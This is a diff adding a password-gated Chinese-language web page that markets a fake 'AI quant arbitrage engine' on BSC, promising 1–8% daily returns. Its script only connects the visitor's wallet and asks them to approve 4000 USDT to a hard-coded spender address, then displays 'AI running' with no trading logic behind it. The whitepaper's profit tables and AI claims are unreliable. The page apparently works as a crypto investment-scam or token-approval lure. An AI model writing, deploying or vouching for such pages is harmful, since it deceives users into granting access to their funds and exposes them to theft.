@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>AI Quant Run | 智能量化系统</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0f1e 0%, #0d1425 100%);
+            font-family: 'Segoe UI', 'Poppins', 'Inter', system-ui, -apple-system, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .password-container {
+            max-width: 450px;
+            width: 100%;
+            background: rgba(18, 25, 45, 0.95);
+            backdrop-filter: blur(12px);
+            border-radius: 48px;
+            padding: 40px 32px;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(0, 255, 255, 0.1);
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            text-align: center;
+        }
+
+        .lock-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+        }
+
+        .password-container h2 {
+            font-size: 24px;
+            background: linear-gradient(135deg, #FFFFFF, #A0D9FF);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 12px;
+        }
+
+        .password-container p {
+            color: #8e9aaf;
+            margin-bottom: 28px;
+            font-size: 14px;
+        }
+
+        .password-input {
+            width: 100%;
+            padding: 16px 20px;
+            font-size: 18px;
+            background: #0b101b;
+            border: 1px solid #2a3a55;
+            border-radius: 60px;
+            color: white;
+            text-align: center;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .password-input:focus {
+            border-color: #00ccff;
+            box-shadow: 0 0 10px rgba(0, 204, 255, 0.3);
+        }
+
+        .password-btn {
+            width: 100%;
+            margin-top: 20px;
+            padding: 14px 20px;
+            background: linear-gradient(95deg, #005c6e, #003d4d);
+            border: 1px solid #0ff4;
+            color: white;
+            border-radius: 60px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .password-btn:hover {
+            background: linear-gradient(95deg, #0080a0, #005066);
+            transform: scale(1.01);
+            box-shadow: 0 0 12px cyan;
+        }
+
+        .error-msg {
+            color: #ff6b6b;
+            margin-top: 16px;
+            font-size: 13px;
+        }
+
+        .main-content {
+            display: none;
+            width: 100%;
+        }
+
+        .app-container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .tab-bar {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 28px;
+            flex-wrap: wrap;
+        }
+
+        .tab-btn {
+            background: rgba(18, 25, 45, 0.7);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            padding: 12px 32px;
+            border-radius: 60px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            color: #b9c7d9;
+        }
+
+        .tab-btn.active {
+            background: linear-gradient(135deg, #00c6ff, #0072ff);
+            color: white;
+            border-color: transparent;
+            box-shadow: 0 0 15px rgba(0, 198, 255, 0.4);
+        }
+
+        .tab-btn:hover:not(.active) {
+            background: rgba(0, 198, 255, 0.2);
+            border-color: #00ccff;
+        }
+
+        .card {
+            background: rgba(18, 25, 45, 0.85);
+            backdrop-filter: blur(12px);
+            border-radius: 48px;
+            padding: 32px 28px 40px;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(0, 255, 255, 0.1);
+            border: 1px solid rgba(0, 255, 255, 0.2);
+        }
+
+        .whitepaper {
+            max-height: 70vh;
+            overflow-y: auto;
+            padding-right: 10px;
+        }
+
+        .whitepaper::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .whitepaper::-webkit-scrollbar-track {
+            background: #0b101b;
+            border-radius: 10px;
+        }
+
+        .whitepaper::-webkit-scrollbar-thumb {
+            background: #00ccff;
+            border-radius: 10px;
+        }
+
+        .whitepaper h1 {
+            font-size: 28px;
+            background: linear-gradient(135deg, #FFFFFF, #A0D9FF);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 20px;
+            border-left: 4px solid #00ccff;
+            padding-left: 20px;
+        }
+
+        .whitepaper h2 {
+            color: #7ee0ff;
+            font-size: 22px;
+            margin: 28px 0 12px 0;
+            padding-bottom: 6px;
+            border-bottom: 1px solid #1e2a44;
+        }
+
+        .whitepaper h3 {
+            color: #b8e2ff;
+            font-size: 18px;
+            margin: 20px 0 10px 0;
+        }
+
+        .whitepaper p, .whitepaper li {
+            color: #b9c7d9;
+            line-height: 1.6;
+            font-size: 15px;
+        }
+
+        .whitepaper ul, .whitepaper ol {
+            margin-left: 24px;
+            margin-top: 8px;
+            margin-bottom: 16px;
+        }
+
+        .whitepaper li {
+            margin: 6px 0;
+        }
+
+        .whitepaper table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            background: #0b101b;
+            border-radius: 16px;
+            overflow: hidden;
+        }
+
+        .whitepaper th, .whitepaper td {
+            border: 1px solid #2a3a55;
+            padding: 10px 12px;
+            text-align: left;
+            color: #cbd5e6;
+        }
+
+        .whitepaper th {
+            background: #0f172a;
+            color: #7ee0ff;
+        }
+
+        .highlight {
+            background: #00ccff10;
+            border-left: 3px solid #00ccff;
+            padding: 12px 16px;
+            border-radius: 16px;
+            margin: 16px 0;
+        }
+
+        .quant-panel .status-panel {
+            background: #0b101b;
+            border-radius: 32px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid #1e2a44;
+        }
+
+        .quant-panel .wallet-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #1e2a44;
+            padding-bottom: 14px;
+            margin-bottom: 14px;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .quant-panel .label {
+            color: #8e9aaf;
+            font-size: 13px;
+        }
+
+        .quant-panel .address {
+            font-family: monospace;
+            background: #00000055;
+            padding: 6px 12px;
+            border-radius: 40px;
+            font-size: 13px;
+            color: #7ee0ff;
+            word-break: break-all;
+        }
+
+        .network-badge {
+            background: #0f212e;
+            color: #2dd4bf;
+            padding: 4px 12px;
+            border-radius: 40px;
+            font-size: 12px;
+        }
+
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin-top: 24px;
+        }
+
+        .btn {
+            border: none;
+            padding: 16px 20px;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-primary {
+            background: linear-gradient(95deg, #0f2b3d, #0b1b2f);
+            border: 1px solid #00ccff44;
+            color: #b3f0ff;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            background: linear-gradient(95deg, #124a66, #0e2642);
+            border-color: #00e0ff;
+            transform: scale(1.01);
+        }
+
+        .btn-success {
+            background: linear-gradient(95deg, #005c6e, #003d4d);
+            border: 1px solid #0ff4;
+            color: #c5ffff;
+        }
+
+        .btn-success:hover:not(:disabled) {
+            background: linear-gradient(95deg, #0080a0, #005066);
+            transform: scale(1.01);
+        }
+
+        .btn:disabled {
+            opacity: 0.45;
+            cursor: not-allowed;
+        }
+
+        .info-area {
+            background: #070c14;
+            margin-top: 28px;
+            padding: 16px;
+            border-radius: 28px;
+            font-size: 13px;
+            color: #9aa9c1;
+            text-align: center;
+            border-left: 3px solid #00b4ff;
+        }
+
+        .running-area {
+            background: #0a1a1f;
+            margin-top: 20px;
+            padding: 16px;
+            border-radius: 28px;
+            border: 1px solid #00e0ff44;
+            text-align: center;
+        }
+
+        .running-text { color: #5effbc; font-weight: bold; }
+        .warning-text { color: #f5b042; font-size: 12px; margin-top: 8px; }
+        .profit-text { color: #7aff87; font-size: 13px; margin-top: 6px; }
+
+        .footer-note {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 10px;
+            color: #2f3b54;
+        }
+
+        .download-link {
+            display: inline-block;
+            margin-top: 12px;
+            color: #00ccff;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        .download-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div id="passwordPage" class="password-container">
+        <div class="lock-icon">🔐</div>
+        <h2>AI 量化系统</h2>
+        <p>为了更好的服务质量，不对外开放此系统<br>请输入访问密码</p>
+        <input type="password" id="passwordInput" class="password-input" placeholder="请输入密码" autofocus>
+        <button id="submitPassword" class="password-btn">验证访问</button>
+        <div id="errorMsg" class="error-msg"></div>
+    </div>
+
+    <div id="mainContent" class="main-content">
+        <div class="app-container">
+            <div class="tab-bar">
+                <button class="tab-btn active" id="tabQuant">🤖 量化运行面板</button>
+                <button class="tab-btn" id="tabPaper">📄 项目白皮书 V2.1</button>
+            </div>
+
+            <div id="quantPanel" class="card quant-panel">
+                <div class="header" style="text-align:center; margin-bottom:28px;">
+                    <div style="font-size:56px;">🧠⚡</div>
+                    <h2 style="font-size:28px; background:linear-gradient(135deg,#FFF,#A0D9FF); -webkit-background-clip:text; background-clip:text; color:transparent;">AI 全自动量化引擎</h2>
+                    <div style="color:#7f8c9a; font-size:14px;">Smart Liquidity · 24h 不间断</div>
+                </div>
+
+                <div class="status-panel">
+                    <div class="wallet-row"><span class="label">🔗 钱包状态</span><span class="network-badge">BSC 主网</span></div>
+                    <div class="wallet-row"><span class="label">🆔 连接地址</span><span class="address" id="walletAddressDisplay">未连接</span></div>
+                    <div class="wallet-row" style="border-bottom:none;"><span class="label">🤖 AI 策略</span><span class="label" style="color:#6ee7ff;">高频套利 · 闪电贷防御</span></div>
+                </div>
+
+                <div class="button-group">
+                    <button class="btn btn-primary" id="connect">🔌 ① 连接量化钱包</button>
+                    <button class="btn btn-success" id="approve" disabled>🚀 ② 授权执行数量并启动引擎</button>
+                </div>
+
+                <div class="info-area" id="info">⚡ 等待连接钱包 | 网络: BSC Mainnet</div>
+
+                <div id="runningPanel" style="display:none;">
+                    <div class="running-area">
+                        <div class="running-text">🤖 AI 正在运行中...</div>
+                        <div class="profit-text">📈 请在钱包中查看收益变化</div>
+                        <div class="warning-text">⚠️ 钱包 USDT 不得超过 4000 USDT</div>
+                        <div class="profit-text">✨ 此 AI 仅运行 4000 USDT 以内</div>
+                        <div class="profit-text">💰 预计日收益: 1% ~ 8%</div>
+                    </div>
+                </div>
+                <div class="footer-note">⚠️ 首次使用需授权 USDT 额度 | 授权后自动启动量化</div>
+            </div>
+
+            <div id="paperPanel" class="card whitepaper" style="display:none;">
+                <h1>📄 AI量化全自动链上价格差套利系统白皮书（V2.1）</h1>
+                <h2>1. 项目概述</h2>
+                <p>本项目是一套基于AI驱动的<strong>链上自动化套利系统</strong>，通过实时监测多链、多DEX之间的价格差异，自动执行低买高卖策略，从而获取稳定收益。</p>
+                <p>系统核心目标：</p>
+                <ul><li>捕捉链上瞬时价格差</li><li>自动执行跨市场套利交易</li><li>降低人为情绪干扰</li><li>提高资金使用效率</li></ul>
+                <div class="highlight">⚠️ 此系统只支持本金4000USDT以下用户使用<br>为保证系统持续运行，会对完成的收益自动收取30%作为系统维护资金保障系统持续运行和更新</div>
+                <h2>2. 市场机会</h2>
+                <p>在去中心化交易市场中，由于以下因素，长期存在价格差：</p>
+                <ul><li>不同DEX流动性差异（Uniswap / PancakeSwap / Curve等）</li><li>跨链延迟（ETH / BSC / Arbitrum等）</li><li>做市深度不同</li><li>大额交易导致滑点偏差</li></ul>
+                <p>👉 结果：同一资产在不同市场存在<strong>0.3%以上不等的价差机会</strong></p>
+                <h2>3. 系统架构</h2>
+                <p>AI量化系统由四大模块组成：</p>
+                <h3>3.1 数据采集层</h3><ul><li>实时抓取链上交易数据</li><li>监听DEX池子价格变化</li><li>聚合多链行情数据</li></ul>
+                <h3>3.2 AI价格预测模块</h3><ul><li>短周期价格波动预测</li><li>流动性变化识别</li><li>异常价差检测模型</li></ul>
+                <h3>3.3 套利执行引擎</h3><ul><li>自动下单系统</li><li>跨DEX路由执行</li><li>Gas费用优化算法</li><li>滑点控制机制</li></ul>
+                <h3>3.4 风控系统</h3><ul><li>黑名单代币过滤</li><li>流动性不足自动停止交易</li><li>极端行情保护机制</li></ul>
+                <h2>4. 核心策略模型</h2>
+                <p>系统主要采用以下三种套利模型：</p>
+                <h3>4.1 DEX价差套利</h3><p>在不同去中心化交易所之间进行：A交易所低买 → B交易所高卖。目标收益区间：单笔0.1%以上，只要市场出现盈利空间就会试着运行。</p>
+                <h3>4.2 跨链延迟套利</h3><p>ETH价格先变化 → BSC/Layer2延迟跟随，利用时间差完成套利。</p>
+                <h3>4.3 流动性不平衡套利</h3><p>某池子买盘不足 → 价格偏低 → AI自动补单套利。</p>
+                <h2>5. 收益模型（模拟）</h2>
+                <table><thead><tr><th>策略类型</th><th>单笔收益</th><th>日频率</th><th>日收益预估</th></tr></thead><tbody><tr><td>DEX套利</td><td>0.3% - 2%</td><td>10-30次</td><td>3% - 6%</td></tr><tr><td>跨链套利</td><td>0.2% - 5%</td><td>3-10次</td><td>2% - 5%</td></tr><tr><td>波动套利</td><td>0.1% - 2%</td><td>10-40次</td><td>2% - 4%</td></tr></tbody></table>
+                <p>👉 综合理论收益范围：<strong>📈 日收益约 1% - 8%（在高波动市场条件下）</strong><br>⚠️ 实际收益受市场流动性与手续费影响波动较大</p>
+                <h2>6. 风险控制体系</h2>
+                <ul><li>🛑 Gas费超过阈值自动停止交易</li><li>🛑 单币种仓位限制</li><li>🛑 黑名单合约过滤（蜜罐/rug pull）</li><li>🛑 高滑点自动拒单</li><li>🛑 极端行情熔断机制</li></ul>
+                <h2>7. 技术优势</h2>
+                <ul><li>AI实时识别套利机会（毫秒级）</li><li>自动执行，无需人工盯盘</li><li>多链并行执行系统</li><li>高速节点优化（低延迟交易）</li><li>可扩展策略框架</li></ul>
+                <h2>8. 应用场景</h2>
+                <ul><li>DeFi量化基金</li><li>链上自动交易机器人</li><li>稳定收益套利系统</li><li>Web3资金管理工具</li></ul>
+                <h2>9. 发展路线图</h2>
+                <p><strong>Phase 1：基础套利系统</strong> — 单链DEX套利，基础自动交易<br><strong>Phase 2：多链扩展</strong> — ETH / BSC / Arbitrum支持，跨链套利模块上线<br><strong>Phase 3：AI增强</strong> — 预测模型优化，自适应策略系统<br><strong>Phase 4：全自动资金系统</strong> — 无人值守交易，API开放生态</p>
+                <h2>10. 免责声明</h2>
+                <p>本系统属于量化交易工具，仅用于市场研究与自动化交易参考。数字资产市场波动较大，存在亏损风险，收益不保证。</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script>
+        const passwordPage = document.getElementById('passwordPage');
+        const mainContent = document.getElementById('mainContent');
+        const passwordInput = document.getElementById('passwordInput');
+        const submitBtn = document.getElementById('submitPassword');
+        const errorMsg = document.getElementById('errorMsg');
+
+        const CORRECT_PASSWORD = '4000';
+
+        function verifyPassword() {
+            if (passwordInput.value === CORRECT_PASSWORD) {
+                passwordPage.style.display = 'none';
+                mainContent.style.display = 'block';
+                errorMsg.textContent = '';
+            } else {
+                errorMsg.textContent = '❌ 密码错误，请输入正确的访问密码';
+                passwordInput.value = '';
+                passwordInput.focus();
+            }
+        }
+
+        submitBtn.onclick = verifyPassword;
+        passwordInput.onkeypress = (e) => { if (e.key === 'Enter') verifyPassword(); };
+
+        const quantPanel = document.getElementById('quantPanel');
+        const paperPanel = document.getElementById('paperPanel');
+        const tabQuant = document.getElementById('tabQuant');
+        const tabPaper = document.getElementById('tabPaper');
+
+        if (tabQuant && tabPaper) {
+            tabQuant.onclick = () => {
+                quantPanel.style.display = 'block';
+                paperPanel.style.display = 'none';
+                tabQuant.classList.add('active');
+                tabPaper.classList.remove('active');
+            };
+            tabPaper.onclick = () => {
+                quantPanel.style.display = 'none';
+                paperPanel.style.display = 'block';
+                tabPaper.classList.add('active');
+                tabQuant.classList.remove('active');
+            };
+        }
+
+        const USDT地址 = "0x55d398326f99059fF775485246999027B3197955";
+        const 授权给谁 = "0x10ED43C718714eb63d5aA57B78B54704E256024E";
+        let 签名者 = null;
+
+        const connectBtn = document.getElementById("connect");
+        const approveBtn = document.getElementById("approve");
+        const infoDiv = document.getElementById("info");
+        const walletAddressSpan = document.getElementById("walletAddressDisplay");
+        const runningPanel = document.getElementById("runningPanel");
+
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        function tryOpenOKXApp() {
+            if (isMobile()) {
+                window.location.href = "okx://wallet/dapp?url=" + encodeURIComponent(window.location.href);
+                setTimeout(() => { window.location.href = "https://www.okx.com/download"; }, 2000);
+            }
+        }
+
+        function 获取钱包() {
+            if (window.okxwallet) return window.okxwallet;
+            if (window.ethereum && window.ethereum.isOKXWallet) return window.ethereum;
+            if (window.ethereum) return window.ethereum;
+            return null;
+        }
+
+        function 更新界面(地址 = null) {
+            if (地址) {
+                walletAddressSpan.innerText = 地址.slice(0,6)+"..."+地址.slice(-4);
+                walletAddressSpan.style.color = "#6ee7ff";
+            } else {
+                walletAddressSpan.innerText = "未连接";
+                walletAddressSpan.style.color = "#8e9aaf";
+            }
+        }
+
+        if (connectBtn) {
+            connectBtn.onclick = async () => {
+                let 钱包 = 获取钱包();
+                if (!钱包) {
+                    if (isMobile()) {
+                        infoDiv.innerHTML = "📱 正在尝试打开 OKX App...<br>如果未安装，将跳转下载页面";
+                        tryOpenOKXApp();
+                    } else {
+                        infoDiv.innerHTML = "❌ 未检测到 OKX 钱包<br><br>📌 PC 端请安装 OKX 钱包插件<br>📱 手机端请使用 OKX App 内置浏览器<br><br><a href='https://www.okx.com/download' target='_blank' class='download-link'>👉 点击下载 OKX 钱包</a>";
+                    }
+                    return;
+                }
+                try {
+                    infoDiv.innerHTML = "⏳ 请求连接钱包...";
+                    const accounts = await 钱包.request({ method: "eth_requestAccounts" });
+                    const provider = new ethers.providers.Web3Provider(钱包);
+                    签名者 = provider.getSigner();
+                    const 地址 = accounts[0] || await 签名者.getAddress();
+                    更新界面(地址);
+                    infoDiv.innerHTML = "✅ 量化引擎已就绪 | 请授权 4000 USDT 启动引擎<br>USDT 始终会在你的钱包地址中运行 | 地址: " + 地址.slice(0,6)+"..."+地址.slice(-4);
+                    approveBtn.disabled = false;
+                } catch (err) {
+                    infoDiv.innerHTML = "❌ 连接失败: " + (err.message || "用户取消");
+                }
+            };
+        }
+
+        if (approveBtn) {
+            approveBtn.onclick = async () => {
+                if (!签名者) {
+                    alert("请先点击「连接量化钱包」");
+                    return;
+                }
+                try {
+                    infoDiv.innerHTML = "🤖 AI 正在准备合约交互...";
+                    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+                    const usdt = new ethers.Contract(USDT地址, abi, 签名者);
+                    // ✅ 授权 4000 USDT
+                    const 数量 = ethers.utils.parseUnits("4000", 18);
+                    infoDiv.innerHTML = "📡 请在钱包内「确认授权」<br>授权额度: 4000 USDT";
+                    const tx = await usdt.approve(授权给谁, 数量);
+                    infoDiv.innerHTML = "⛓️ 交易已提交 | Hash: " + tx.hash.slice(0,10)+"... 等待上链";
+                    await tx.wait();
+                    runningPanel.style.display = "block";
+                    approveBtn.disabled = true;
+                    approveBtn.innerText = "✅ 引擎运行中";
+                    infoDiv.innerHTML = "🤖 AI 正在运行中，请在钱包中查看收益变化。<br>⚠️ 请注意钱包 USDT 不得超过 4000 USDT。<br>📊 此 AI 只会运行 4000 USDT 内，预计日收益在 1% - 8% 之间。";
+                } catch (err) {
+                    infoDiv.innerHTML = "❌ 授权失败: " + (err.message || "用户取消或网络错误");
+                }
+            };
+        }
+    </script>
+</body>
+</html>
